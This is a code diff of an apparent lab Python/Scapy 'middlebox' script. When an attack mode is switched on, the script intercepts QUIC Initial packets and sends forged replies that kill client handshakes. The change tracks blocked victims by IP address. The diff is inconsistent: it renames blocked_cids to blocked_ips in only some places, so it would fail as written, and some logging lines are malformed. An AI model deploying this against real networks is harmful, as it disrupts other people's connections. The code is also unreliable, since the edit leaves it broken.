@@ -15,7 +15,7 @@ ports = {}
 
 import threading, sys, os
 attack_mode   = False          # False → transparent, True → block handshakes
-blocked_cids  = set()          # connection IDs we have already killed this run
+blocked_ips  = set()          # victim IPs we have already killed this run
 def operator_cli():
     global attack_mode, blocked_cids
     while True:
@@ -49,7 +49,7 @@ def add_and_send_to_server(pkt):
     send(new_pkt, iface='middlebox-eth1')
 
 def handle_quic(pkt):
-    global ports, attack_mode, blocked_cids
+    global ports, attack_mode, blocked_ips
     # Only process if this packet has a QUIC Initial header
     if pkt.haslayer(UDP) and pkt.getlayer(Ether).src != get_if_hwaddr('middlebox-eth0') and pkt.getlayer(Ether).src != get_if_hwaddr('middlebox-eth1'):
         if pkt.sniffed_on == 'middlebox-eth0':
@@ -66,9 +66,8 @@ def handle_quic(pkt):
                 - TokenLength   : {qi.TokenLen}")
                 - PacketNumber  : {qi.PacketNumber}")
                 - PayloadLength : {qi.Length}""")
-                cid = qi.SrcConnID.hex()
                 if attack_mode:
-                    if cid not in blocked_cids:
+                    if pkt[IP].src not in blocked_cids:
                         """initial =  QUIC_Initial(
                             Version      = 0x00000001,
                             DstConnIDLen = len(qi.SrcConnID), DstConnID=qi.SrcConnID,
@@ -98,7 +97,7 @@ def handle_quic(pkt):
                             tpl = tpl,
                             frame = frame)
                         send(forged, iface='middlebox-eth0')
-                        blocked_cids.add(cid)
+                        blocked_cids.add(pkt[IP].src)
                     return
                 
             add_and_send_to_server(pkt)
